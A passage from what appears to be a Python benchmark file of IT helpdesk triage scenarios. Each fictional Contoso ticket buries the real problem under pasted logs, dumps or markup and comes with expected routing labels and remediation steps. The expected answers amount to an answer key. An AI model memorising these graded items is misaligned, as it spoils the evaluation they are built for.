            reporter_name="Amelia Foster",
            reporter_email="amelia.foster@contoso.com",
            reporter_department="Data Science",
            channel=Channel.CHAT,
            tags=["data-cleanup", "azure-cli-output", "json-dump"],
            difficulty="medium",
        ),
        # ── DC-135  macOS kernel panic crash report ────────────────────
        ScenarioDefinition(
            scenario_id="DC-135",
            subject="MacBook Pro keeps crashing — panic report attached",
            description=(
                "My MacBook Pro crashes every 2-3 hours. Here's the crash report:\n\n"
                "panic(cpu 4 caller 0xffffff800a2e1f30): Kernel trap at 0xffffff7f8b2c4020, "
                "type 14=page fault\n"
                "CR0: 0x0000000080010033, CR2: 0xffffff80deadbeef, CR3: 0x000000010a814000, "
                "CR4: 0x00000000003626e0\n"
                "RAX: 0x0000000000000000, RBX: 0xffffff800a4e3100, "
                "RCX: 0xffffff80deadbeef, RDX: 0x0000000000000001\n"
                "RSP: 0xffffff920d5fba80, RBP: 0xffffff920d5fbb00, "
                "RSI: 0x0000000000000040, RDI: 0xffffff8015a32000\n"
                "R8:  0x0000000000000000, R9:  0x0000000000000000, "
                "R10: 0xffffff800a2c1480, R11: 0x0000000000000246\n"
                "R12: 0xffffff8015a32000, R13: 0x0000000000000001, "
                "R14: 0x0000000000000000, R15: 0xffffff800a4e3100\n"
                "RFL: 0x0000000000010282, RIP: 0xffffff7f8b2c4020, "
                "CS:  0x0000000000000008, SS:  0x0000000000000010\n\n"
                "Backtrace (CPU 4), Frame : Return Address\n"
                "0xffffff920d5fb680 : 0xffffff800a0bb0a0\n"
                "0xffffff920d5fb6d0 : 0xffffff800a21c5bc\n"
                "0xffffff920d5fb710 : 0xffffff800a20c5a9\n"
                "0xffffff920d5fb760 : 0xffffff800a05f8e0\n"
                "0xffffff920d5fb980 : 0xffffff800a2e1f30\n\n"
                "Kernel Extensions in backtrace:\n"
                "  com.apple.iokit.IOThunderboltFamily(9.4.2)\n"
                "  com.apple.driver.AppleThunderboltNHI(7.2.81)\n\n"
                "Model: MacBookPro18,1, BootROM 10151.140.19, 10 processors, "
                "Apple M1 Pro, 16 GB, SMC\n"
                "macOS Version 14.3 (Build 23D56)\n\n"
                "The crashes happen randomly but seem more frequent when I use my "
                "CalDigit TS4 Thunderbolt dock. Can you replace the dock or the laptop?"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.REPRODUCTION_FREQUENCY, MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Ignore the kernel panic registers and backtrace dump. Focus on the "
                "pattern: crashes correlate with CalDigit TS4 Thunderbolt dock usage. "
                "The backtrace implicates IOThunderboltFamily, suggesting a dock or "
                "Thunderbolt driver issue."
            ),
            remediation_steps=[
                "Update macOS to the latest point release to get Thunderbolt driver fixes.",
                "Update the CalDigit TS4 dock firmware from the manufacturer's site.",
                "Test the MacBook without the dock for 1-2 days to confirm the correlation.",
                "If dock-related, provide a replacement dock or try a different Thunderbolt port.",
                "If crashes persist without the dock, schedule a Genius Bar or AASP hardware diagnostic.",
            ],
            reporter_name="Sophia Chen",
            reporter_email="sophia.chen@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "kernel-panic", "macos-crash-report"],
            difficulty="hard",
        ),
        # ── DC-136  iptables firewall rules dump ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-136",
            subject="Can't reach internal API server — firewall rules listed below",
            description=(
                "I can't connect to our internal API at api-internal.contoso.com:8443 "
                "from my workstation. I dumped the firewall rules on the server:\n\n"
                "Chain INPUT (policy DROP)\n"
                "target     prot opt source               destination\n"
                "ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0  state RELATED,ESTABLISHED\n"
                "ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0\n"
                "ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0  /* loopback */\n"
                "ACCEPT     tcp  --  10.0.0.0/8           0.0.0.0/0  tcp dpt:22\n"
                "ACCEPT     tcp  --  10.0.1.0/24          0.0.0.0/0  tcp dpt:8443\n"
                "ACCEPT     tcp  --  10.0.2.0/24          0.0.0.0/0  tcp dpt:8443\n"
                "DROP       all  --  0.0.0.0/0            0.0.0.0/0\n\n"
                "Chain FORWARD (policy DROP)\n"
                "target     prot opt source               destination\n\n"
                "Chain OUTPUT (policy ACCEPT)\n"
                "target     prot opt source               destination\n\n"
                "My workstation IP is 10.0.3.45 which is on the 10.0.3.0/24 subnet "
                "(3rd floor, Building 2). It looks like only 10.0.1.0/24 and "
                "10.0.2.0/24 are allowed. Can you add 10.0.3.0/24 to the firewall?\n\n"
                "Thanks,\nLuis Ramirez"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.BUSINESS_IMPACT, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "The user correctly identified the issue: the iptables INPUT chain on "
                "api-internal.contoso.com only allows port 8443 from 10.0.1.0/24 and "
                "10.0.2.0/24 subnets, but the user is on 10.0.3.0/24."
            ),
            remediation_steps=[
                "Verify the change request through proper approval channels before modifying production"
                " firewall rules.",
                "Add an iptables rule: iptables -I INPUT 6 -s 10.0.3.0/24 -p tcp --dport 8443 -j ACCEPT.",
                "Save the iptables configuration to persist across reboots.",
                "Verify connectivity from the user's workstation (10.0.3.45) after the rule change.",
                "Update the firewall documentation to reflect the new subnet allowlist.",
            ],
            reporter_name="Luis Ramirez",
            reporter_email="luis.ramirez@contoso.com",
            reporter_department="Backend Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "iptables-dump", "firewall-rules"],
            difficulty="medium",
        ),
        # ── DC-137  LDAP search results dump ───────────────────────────
        ScenarioDefinition(
            scenario_id="DC-137",
            subject="AD account not authenticating — ldapsearch output",
            description=(
                "My account stopped working for LDAP-based authentication to the "
                "legacy trading system. I ran an ldapsearch and here's what I got:\n\n"
                "# extended LDIF\n"
                "# LDAPv3\n"
                "# base <DC=contoso,DC=local> with scope subtree\n"
                "# filter: (sAMAccountName=j.nakamura)\n"
                "# requesting: ALL\n\n"
                "dn: CN=Jun Nakamura,OU=Trading,OU=Users,DC=contoso,DC=local\n"
                "objectClass: top\n"
                "objectClass: person\n"
                "objectClass: organizationalPerson\n"
                "objectClass: user\n"
                "cn: Jun Nakamura\n"
                "sn: Nakamura\n"
                "givenName: Jun\n"
                "distinguishedName: CN=Jun Nakamura,OU=Trading,OU=Users,DC=contoso,"
                "DC=local\n"
                "displayName: Jun Nakamura\n"
                "memberOf: CN=Trading-Floor-Users,OU=Groups,DC=contoso,DC=local\n"
                "memberOf: CN=Bloomberg-Access,OU=Groups,DC=contoso,DC=local\n"
                "memberOf: CN=VPN-Users,OU=Groups,DC=contoso,DC=local\n"
                "sAMAccountName: j.nakamura\n"
                "userPrincipalName: j.nakamura@contoso.com\n"
                "userAccountControl: 514\n"
                "lockoutTime: 133567890123456789\n"
                "pwdLastSet: 133490000000000000\n"
                "accountExpires: 133600000000000000\n"
                "lastLogon: 133567800000000000\n\n"
                "# search result\n"
                "search: 2\n"
                "result: 0 Success\n\n"
                "I notice userAccountControl is 514 which I think means disabled? "
                "And the lockoutTime has a value. I need this fixed ASAP as I can't "
                "execute trades."
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P1,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.TIMESTAMP, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "The LDAP output confirms the account (j.nakamura) has "
                "userAccountControl=514 (account disabled) and a non-zero lockoutTime. "
                "Re-enable the account and clear the lockout."
            ),
            remediation_steps=[
                "Unlock the Active Directory account using 'Unlock-ADAccount -Identity j.nakamura'.",
                "Re-enable the account using 'Enable-ADAccount -Identity j.nakamura'.",
                "Investigate why the account was disabled (security incident, HR action, or automated policy).",
                "Verify the account password has not expired (pwdLastSet check against policy).",
                "Confirm the user can authenticate to the legacy trading system after account restoration.",
            ],
            reporter_name="Jun Nakamura",
            reporter_email="jun.nakamura@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.PHONE,
            tags=["data-cleanup", "ldap-output", "active-directory"],
            difficulty="hard",
        ),
        # ── DC-138  SQL Server execution plan XML ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-138",
            subject="Slow query on settlement database — execution plan",
            description=(
                "The daily settlement reconciliation query is taking 45 minutes instead "
                "of the usual 3 minutes. I exported the execution plan from SSMS:\n\n"
                '<?xml version="1.0"?>\n'
                '<ShowPlanXML xmlns="http://schemas.microsoft.com/sqlserver/2004/'
                '07/showplan" Version="1.6" Build="16.0.4085.2">\n'
                "  <BatchSequence>\n"
                "    <Batch>\n"
                "      <Statements>\n"
                '        <StmtSimple StatementText="SELECT t.TradeID, t.Amount...'
                '" StatementId="1" StatementType="SELECT"\n'
                '          StatementSubTreeCost="847234.2" StatementEstRows="3400000">\n'
                '          <QueryPlan CachedPlanSize="128" CompileTime="4521"\n'
                '            CompileCPU="4521" CompileMemory="65536">\n'
                '            <RelOp NodeId="0" PhysicalOp="Hash Match"\n'
                '              LogicalOp="Inner Join" EstimateRows="3400000"\n'
                '              EstimatedTotalSubtreeCost="847234.2">\n'
                "              <OutputList>\n"
                '                <ColumnReference Table="[trades]" Column="TradeID"/>\n'
                "              </OutputList>\n"
                "              <Hash>\n"
                '                <RelOp PhysicalOp="Table Scan"\n'
                '                  LogicalOp="Table Scan" EstimateRows="15000000"\n'
                '                  TableCardinality="15000000">\n'
                "                </RelOp>\n"
                "              </Hash>\n"
                "            </RelOp>\n"
                "          </QueryPlan>\n"
                "        </StmtSimple>\n"
                "      </Statements>\n"
                "    </Batch>\n"
                "  </BatchSequence>\n"
                "</ShowPlanXML>\n\n"
                "The execution plan shows a Table Scan on 15 million rows in the trades "
                "table. I think we need an index but I don't have DBA access to create one.\n\n"
                "Database: SQLPROD-SETTLE-01\n"
                "Query: Daily reconciliation (job: DailyRecon_0600)"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.BUSINESS_IMPACT, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Ignore the XML execution plan dump. The key issue is a full table scan "
                "on a 15M-row trades table causing the daily reconciliation to run 15x "
                "slower than normal. A missing or fragmented index is the likely cause."
            ),
            remediation_steps=[
                "Analyze the reconciliation query and identify missing indexes using the Missing Index DMVs.",
                "Create the recommended index on the trades table (likely on the join/filter columns).",
                "Check index fragmentation levels and rebuild if above 30%.",
                "Update statistics on the trades table if they are stale.",
                "Monitor the query execution time after the index change to confirm improvement.",
            ],
            reporter_name="Patricia Volkov",
            reporter_email="patricia.volkov@contoso.com",
            reporter_department="Settlements",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "execution-plan-xml", "sql-server"],
            difficulty="hard",
        ),
        # ── DC-139  IIS access log entries pasted ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-139",
            subject="Internal compliance portal returning 503 — IIS logs",
            description=(
                "The compliance portal (compliance.contoso.com) keeps returning 503 errors. "
                "I grabbed some IIS log entries:\n\n"
                "#Software: Microsoft Internet Information Services 10.0\n"
                "#Version: 1.0\n"
                "#Date: 2026-03-18 14:00:01\n"
                "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port "
                "cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus "
                "sc-win32-status time-taken\n"
                "2026-03-18 14:00:01 10.0.5.20 GET /dashboard - 443 CONTOSO\\a.singh "
                "10.0.3.12 Mozilla/5.0+(Windows+NT+10.0) - 503 0 0 15625\n"
                "2026-03-18 14:00:02 10.0.5.20 GET /api/compliance/status - 443 "
                "CONTOSO\\b.johnson 10.0.3.15 Mozilla/5.0+(Windows+NT+10.0) - 503 0 0 15640\n"
                "2026-03-18 14:00:03 10.0.5.20 GET /dashboard - 443 CONTOSO\\c.lee "
                "10.0.3.22 Mozilla/5.0+(Windows+NT+10.0) - 503 0 0 15680\n"
                "2026-03-18 14:00:04 10.0.5.20 GET /reports/quarterly - 443 "
                "CONTOSO\\d.patel 10.0.3.44 Mozilla/5.0+(Windows+NT+10.0) - 503 0 0 15590\n"
                "2026-03-18 14:00:05 10.0.5.20 POST /api/upload - 443 CONTOSO\\e.kim "
                "10.0.3.18 Mozilla/5.0+(Windows+NT+10.0) - 503 0 0 15700\n"
                "2026-03-18 14:00:06 10.0.5.20 GET /healthcheck - 443 - 10.0.5.1 "
                "HealthChecker/2.0 - 503 0 0 15550\n"
                "2026-03-18 14:00:07 10.0.5.20 GET /dashboard - 443 CONTOSO\\f.garcia "
                "10.0.3.30 Mozilla/5.0+(Windows+NT+10.0) - 503 0 0 15620\n"
                "2026-03-18 14:00:08 10.0.5.20 GET /api/compliance/alerts - 443 "
                "CONTOSO\\g.tanaka 10.0.3.55 Mozilla/5.0+(Windows+NT+10.0) - 503 0 0 15660\n\n"
                "(continues for hundreds of lines)\n\n"
                "Every single request is returning 503. This affects the entire "
                "Compliance department — about 40 people can't work. The quarterly "
                "regulatory filing deadline is in 3 days."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P1,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "The IIS logs confirm a complete outage of compliance.contoso.com "
                "with 100% 503 errors affecting ~40 users. The uniform sc-win32-status=0 "
                "and ~15.6s response times suggest the application pool has crashed or "
                "the backend service is down. Urgent — regulatory filing deadline in 3 days."
            ),
            remediation_steps=[
                "Check the IIS application pool for compliance.contoso.com — recycle it if stopped or failing.",
                "Check the backend application service and database connectivity.",
                "Review the Windows Event Log on the IIS server for application crash details.",
                "If the app pool keeps crashing, check for memory leaks or unhandled exceptions in application logs.",
                "Escalate to the application development team if the issue is a code-level crash.",
            ],
            reporter_name="Anil Singh",
            reporter_email="anil.singh@contoso.com",
            reporter_department="Compliance",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "iis-access-logs", "web-server-logs"],
            difficulty="hard",
        ),
        # ── DC-140  npm dependency tree output ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-140",
            subject="npm install failing — dependency tree conflict",
            description=(
                "I'm trying to set up the internal dashboard project and npm install "
                "keeps failing. Here's the dependency tree output:\n\n"
                "npm ERR! code ERESOLVE\n"
                "npm ERR! ERESOLVE could not resolve\n"
                "npm ERR!\n"
                "npm ERR! While resolving: @contoso/dashboard-widgets@3.2.1\n"
                "npm ERR! Found: react@18.2.0\n"
                "npm ERR! node_modules/react\n"
                'npm ERR!   react@"^18.2.0" from the root project\n'
                'npm ERR!   peer react@"^18.0.0" from @contoso/ui-kit@5.1.0\n'
                "npm ERR!   node_modules/@contoso/ui-kit\n"
                'npm ERR!     @contoso/ui-kit@"^5.0.0" from the root project\n'
                "npm ERR!\n"
                "npm ERR! Could not resolve dependency:\n"
                'npm ERR! peer react@"^17.0.0" from @contoso/legacy-charts@2.8.4\n'
                "npm ERR! node_modules/@contoso/legacy-charts\n"
                'npm ERR!   @contoso/legacy-charts@"^2.8.0" from '
                "@contoso/dashboard-widgets@3.2.1\n"
                "npm ERR!   node_modules/@contoso/dashboard-widgets\n"
                'npm ERR!     @contoso/dashboard-widgets@"^3.2.0" from the root project\n'
                "npm ERR!\n"
                "npm ERR! Conflicting peer dependency: react@17.0.2\n"
                "npm ERR! node_modules/react\n"
                'npm ERR!   peer react@"^17.0.0" from @contoso/legacy-charts@2.8.4\n'
                "npm ERR!   node_modules/@contoso/legacy-charts\n\n"
                "npm ERR! Fix the upstream dependency conflict, or retry\n"
                "npm ERR! this command with --force or --legacy-peer-deps\n\n"
                "The @contoso/legacy-charts package requires React 17 but everything "
                "else uses React 18. I need this working for the dashboard demo on "
                "Friday. I don't want to use --force blindly."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "The npm ERESOLVE output pinpoints the issue: @contoso/legacy-charts@2.8.4 "
                "has a peer dependency on React 17, conflicting with the project's React 18. "
                "Coordinate with the internal package maintainers to update legacy-charts."
            ),
            remediation_steps=[
                "Check if a newer version of @contoso/legacy-charts supports React 18.",
                "If no update is available, contact the internal package team to request a React"
                " 18-compatible release.",
                "As a short-term workaround, use npm install --legacy-peer-deps (but document this technical debt).",
                "Consider replacing @contoso/legacy-charts with an alternative charting library compatible"
                " with React 18.",
                "Update the project documentation to note the peer dependency constraint.",
            ],
            reporter_name="Maya Johansson",
            reporter_email="maya.johansson@contoso.com",
            reporter_department="Frontend Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "npm-dependency-tree", "package-conflict"],
            difficulty="medium",
        ),
        # ── DC-141  Terraform / IaC config dump ────────────────────────
        ScenarioDefinition(
            scenario_id="DC-141",
            subject="Azure VM not deploying — Terraform state attached",
            description=(
                "Hi team,\n\n"
                "I've been trying to deploy a new Azure VM through our Terraform pipeline "
                "and it keeps failing. I'm pasting the relevant state JSON so you can see "
                "what's going on:\n\n"
                "{\n"
                '  "version": 4,\n'
                '  "terraform_version": "1.7.3",\n'
                '  "serial": 42,\n'
                '  "lineage": "a3f8e1c2-94d7-4b1e-bf3a-6e82d9c0f1a5",\n'
                '  "outputs": {},\n'
                '  "resources": [\n'
                "    {\n"
                '      "mode": "managed",\n'
                '      "type": "azurerm_virtual_machine",\n'
                '      "name": "contoso_risk_engine_vm",\n'
                '      "provider": "provider[\\"registry.terraform.io/hashicorp/azurerm\\"]",\n'
                '      "instances": [\n'
                "        {\n"
                '          "schema_version": 0,\n'
                '          "attributes": {\n'
                '            "id": "/subscriptions/9f3e2a71-xxxx-xxxx-xxxx-xxxxxxxxxxxx'
                "/resourceGroups/rg-contoso-prod-eastus/providers/Microsoft.Compute"
                '/virtualMachines/vm-risk-engine-01",\n'
                '            "name": "vm-risk-engine-01",\n'
                '            "location": "eastus",\n'
                '            "vm_size": "Standard_D8s_v5",\n'
                '            "os_profile": {\n'
                '              "computer_name": "vm-risk-engine-01",\n'
                '              "admin_username": "contosoadmin"\n'
                "            },\n"
                '            "storage_os_disk": {\n'
                '              "name": "osdisk-risk-engine-01",\n'
                '              "caching": "ReadWrite",\n'
                '              "create_option": "FromImage",\n'
                '              "managed_disk_type": "Premium_LRS",\n'
                '              "disk_size_gb": 256\n'
                "            },\n"
                '            "network_interface_ids": [\n'
                '              "/subscriptions/9f3e2a71-xxxx-xxxx-xxxx-xxxxxxxxxxxx'
                "/resourceGroups/rg-contoso-prod-eastus/providers/Microsoft.Network"
                '/networkInterfaces/nic-risk-engine-01"\n'
                "            ],\n"
                '            "tags": {\n'
                '              "environment": "production",\n'
                '              "team": "risk-analytics",\n'
                '              "cost_center": "CC-4402"\n'
                "            }\n"
                "          }\n"
                "        }\n"
                "      ]\n"
                "    }\n"
                "  ]\n"
                "}\n\n"
                "The actual error during `terraform apply` is:\n"
                'Error: creating Virtual Machine "vm-risk-engine-02": the SKU '
                '"Standard_D8s_v5" is not available in location "eastus" for '
                'subscription "9f3e2a71-xxxx".\n\n'
                "I need this VM for the new risk engine replica. Deployment deadline "
                "is end of week."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "The Terraform state dump is noise — the real issue is an Azure SKU "
                "availability error: Standard_D8s_v5 is not available in the eastus "
                "region for this subscription. Check quota limits or choose an "
                "alternative VM size or region."
            ),
            remediation_steps=[
                "Run `az vm list-skus --location eastus --size Standard_D8s_v5` to confirm SKU availability.",
                "Check the subscription's vCPU quota with `az vm list-usage --location eastus` and request an increase"
                " if needed.",
                "If the SKU is restricted, try an alternative size such as Standard_D8as_v5 or deploy to a different"
                " region.",
                "Update the Terraform configuration with the corrected VM size"
                " or location and re-run `terraform plan`.",
                "Document the SKU limitation in the team's infrastructure runbook for future reference.",
            ],
            reporter_name="Ethan Kowalski",
            reporter_email="ethan.kowalski@contoso.com",
            reporter_department="Risk Analytics Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "terraform", "iac-dump"],
            difficulty="medium",
        ),
        # ── DC-142  Prometheus / Grafana metrics dump ──────────────────
        ScenarioDefinition(
            scenario_id="DC-142",
            subject="App response time spiking — Prometheus metrics attached",
            description=(
                "We're seeing major latency spikes on the portfolio analytics service "
                "since around 10 AM today. I exported some Prometheus metrics that show "
                "the problem:\n\n"
                "# HELP http_request_duration_seconds HTTP request latency\n"
                "# TYPE http_request_duration_seconds histogram\n"
                'http_request_duration_seconds_bucket{method="GET",endpoint="/api/v2/portfolio",'
                'status="200",le="0.05"} 12\n'
                'http_request_duration_seconds_bucket{method="GET",endpoint="/api/v2/portfolio",'
                'status="200",le="0.1"} 45\n'
                'http_request_duration_seconds_bucket{method="GET",endpoint="/api/v2/portfolio",'
                'status="200",le="0.5"} 112\n'
                'http_request_duration_seconds_bucket{method="GET",endpoint="/api/v2/portfolio",'
                'status="200",le="1.0"} 389\n'
                'http_request_duration_seconds_bucket{method="GET",endpoint="/api/v2/portfolio",'
                'status="200",le="5.0"} 1823\n'
                'http_request_duration_seconds_bucket{method="GET",endpoint="/api/v2/portfolio",'
                'status="200",le="10.0"} 2401\n'
                'http_request_duration_seconds_bucket{method="GET",endpoint="/api/v2/portfolio",'
                'status="200",le="+Inf"} 2455\n'
                'http_request_duration_seconds_sum{method="GET",endpoint="/api/v2/portfolio",'
                'status="200"} 8934.21\n'
                'http_request_duration_seconds_count{method="GET",endpoint="/api/v2/portfolio",'
                'status="200"} 2455\n\n'
                "# HELP http_requests_total Total HTTP requests\n"
                "# TYPE http_requests_total counter\n"
                'http_requests_total{method="GET",endpoint="/api/v2/portfolio",'
                'status="200"} 2455\n'
                'http_requests_total{method="GET",endpoint="/api/v2/portfolio",'
                'status="504"} 387\n'
                'http_requests_total{method="POST",endpoint="/api/v2/trades",'
                'status="200"} 892\n'
                'http_requests_total{method="POST",endpoint="/api/v2/trades",'
                'status="504"} 64\n\n'
                "# HELP process_cpu_seconds_total Total user and system CPU time\n"
                "# TYPE process_cpu_seconds_total counter\n"
                "process_cpu_seconds_total 48923.17\n\n"
                "# HELP process_resident_memory_bytes Resident memory size in bytes\n"
                "# TYPE process_resident_memory_bytes gauge\n"
                "process_resident_memory_bytes 4.831838208e+09\n\n"
                "The Grafana dashboard shows p99 latency went from 200ms to over 8 "
                "seconds at 10:05 AM on March 19, 2026. Traders are complaining that "
                "portfolio views take forever. About 15% of requests are timing out with "
                "504s. Memory usage on the pod looks very high (~4.8 GB). This needs to "
                "be fixed ASAP before the afternoon trading session."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "The Prometheus metrics dump obscures the core issue but reveals key "
                "signals: p99 latency spiked to ~8s, 15% of requests return 504, and "
                "resident memory is ~4.8 GB (likely a memory leak or missing resource "
                "limit). Investigate the portfolio analytics pod for memory pressure and "
                "potential OOM conditions."
            ),
            remediation_steps=[
                "Check Kubernetes pod status and recent restarts with `kubectl get pods` and `kubectl describe pod` for"
                " the portfolio analytics service.",
                "Review container memory limits and compare against the 4.8 GB resident memory — increase limits or fix"
                " the memory leak.",
                "Check if a recent deployment correlates with the 10:05 AM latency spike and roll back if necessary.",
                "Restart the affected pods as an immediate mitigation to free memory.",
                "Set up a Grafana alert for p99 latency > 2s to catch regressions earlier.",
            ],
            reporter_name="Priya Narayanan",
            reporter_email="priya.narayanan@contoso.com",
            reporter_department="Portfolio Analytics",
            channel=Channel.CHAT,
            tags=["data-cleanup", "metrics-dump", "monitoring-noise"],
            difficulty="medium",
        ),
        # ── DC-143  Email with deeply nested HTML table ────────────────
        ScenarioDefinition(
            scenario_id="DC-143",
            subject="FW: Financial report not generating — see table below",
            description=(
                "Forwarding this from my Outlook — the report generator is broken again.\n"
                "Below is what the output looks like when I try to export:\n\n"
                "<html><body>"
                "<table border='1' cellpadding='5' cellspacing='0' "
                "style='border-collapse:collapse;width:100%'>"
                "<tr style='background-color:#004578;color:white;font-weight:bold'>"
                "<td>Report ID</td><td>Status</td><td>Generated</td>"
                "<td>Error Code</td><td>Department</td></tr>"
                "<tr><td>RPT-2026-Q1-001</td><td style='color:red'>FAILED</td>"
                "<td>2026-03-20 08:15:03</td><td>ERR_TEMPLATE_RENDER_0x8004</td>"
                "<td>Treasury</td></tr>"
                "<tr><td>RPT-2026-Q1-002</td><td style='color:red'>FAILED</td>"
                "<td>2026-03-20 08:15:04</td><td>ERR_TEMPLATE_RENDER_0x8004</td>"
                "<td>Risk Management</td></tr>"
                "<tr><td>RPT-2026-Q1-003</td><td style='color:green'>OK</td>"
                "<td>2026-03-20 08:15:05</td><td></td><td>Compliance</td></tr>"
                "<tr><td>RPT-2026-Q1-004</td><td style='color:red'>FAILED</td>"
                "<td>2026-03-20 08:15:06</td><td>ERR_TEMPLATE_RENDER_0x8004</td>"
                "<td>Treasury</td></tr>"
                "<tr><td>RPT-2026-Q1-005</td><td style='color:red'>FAILED</td>"
                "<td>2026-03-20 08:15:07</td><td>ERR_DATASOURCE_TIMEOUT</td>"
                "<td>Equities Trading</td></tr>"
                "<tr><td colspan='5' style='background-color:#f0f0f0;font-style:italic'>"
                "Nested sub-table follows:</td></tr>"
                "<tr><td colspan='5'><table border='1' cellpadding='3' width='100%'>"
                "<tr style='background-color:#d4e6f1'><td>Sub-Report</td>"
                "<td>Data Source</td><td>Row Count</td><td>Duration (ms)</td></tr>"
                "<tr><td>Treasury P&amp;L</td><td>SQL-PROD-03</td>"
                "<td>148,293</td><td>45,200</td></tr>"
                "<tr><td>Risk VaR</td><td>SQL-PROD-03</td>"
                "<td>0</td><td>TIMEOUT</td></tr>"
                "<tr><td>Compliance AML</td><td>SQL-PROD-04</td>"
                "<td>12,847</td><td>3,200</td></tr>"
                "</table></td></tr>"
                "</table>"
                "<p style='font-family:Calibri;font-size:11pt'>"
                "&nbsp;</p>"
                "<p style='font-family:Calibri;font-size:11pt'>"
                "Sent from my iPhone</p>"
                "</body></html>\n\n"
                "The quarterly financial reports for Treasury and Risk Management are "
                "failing with ERR_TEMPLATE_RENDER_0x8004. One sub-report (Risk VaR) is "
                "timing out against SQL-PROD-03 with zero rows returned. The Q1 filing "
                "deadline is March 25. Please help urgently.\n\n"
                "Thanks,\nGrace"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "The HTML table noise contains the actual signal: quarterly reports are "
                "failing with ERR_TEMPLATE_RENDER_0x8004 and one data source (SQL-PROD-03) "
                "is timing out on the Risk VaR sub-report. Investigate the SQL-PROD-03 "
                "connection and the report template engine."
            ),
            remediation_steps=[
                "Check connectivity and performance of SQL-PROD-03 — the Risk VaR sub-report returned 0 rows with a"
                " TIMEOUT.",
                "Review the report template engine logs for ERR_TEMPLATE_RENDER_0x8004 to identify the root cause.",
                "Verify that the Q1 data set is fully loaded into the Treasury and Risk Management data sources.",
                "Re-run the failed reports individually to isolate whether the issue is the template engine or the data"
                " source.",
                "Escalate to the DBA team if SQL-PROD-03 is experiencing broader performance issues.",
            ],
            reporter_name="Grace Thornton",
            reporter_email="grace.thornton@contoso.com",
            reporter_department="Treasury Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "nested-html-table", "outlook-format"],
            difficulty="hard",
        ),
        # ── DC-144  macOS system profiler output ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-144",
            subject="MacBook USB-C port not working — system profiler dump",
            description=(
                "My left USB-C port stopped recognizing any devices. I ran "
                "`system_profiler SPHardwareDataType SPUSBDataType` as support "
                "suggested last time. Here's the output:\n\n"
                "Hardware:\n\n"
                "    Hardware Overview:\n\n"
                "      Model Name: MacBook Pro\n"
                "      Model Identifier: Mac14,5\n"
                "      Model Number: Z17G000SDB\n"
                "      Chip: Apple M2 Max\n"
                "      Total Number of Cores: 12 (8 performance and 4 efficiency)\n"
                "      Memory: 32 GB\n"
                "      System Firmware Version: 10151.101.3\n"
                "      OS Loader Version: 10151.101.3\n"
                "      Serial Number (system): C02FX3ABCDEF\n"
                "      Hardware UUID: A1B2C3D4-E5F6-7890-ABCD-EF1234567890\n"
                "      Provisioning UDID: 00006020-001234560A56001E\n"
                "      Activation Lock Status: Enabled\n\n"
                "USB:\n\n"
                "    USB 3.1 Bus:\n\n"
                "      Host Controller Driver: AppleT6000USBXHCI\n"
                "      PCI Device ID: 0x1100\n"
                "      PCI Revision ID: 0x0000\n"
                "      PCI Vendor ID: 0x1de4\n\n"
                "        USB3.1 Hub:\n\n"
                "          Product ID: 0x8110\n"
                "          Vendor ID: 0x0bda (Realtek Semiconductor Corp.)\n"
                "          Version: 1.17\n"
                "          Speed: Up to 10 Gb/s\n"
                "          Location ID: 0x02200000 / 1\n"
                "          Current Available (mA): 900\n"
                "          Current Required (mA): 0\n\n"
                "    USB 3.1 Bus:\n\n"
                "      Host Controller Driver: AppleT6000USBXHCI\n"
                "      PCI Device ID: 0x1100\n"
                "      PCI Revision ID: 0x0000\n"
                "      PCI Vendor ID: 0x1de4\n\n"
                "        (No USB devices connected on this bus)\n\n"
                "The second USB 3.1 Bus (left side) shows no devices even when I "
                "plug in my external monitor, USB drive, or Ethernet adapter. The "
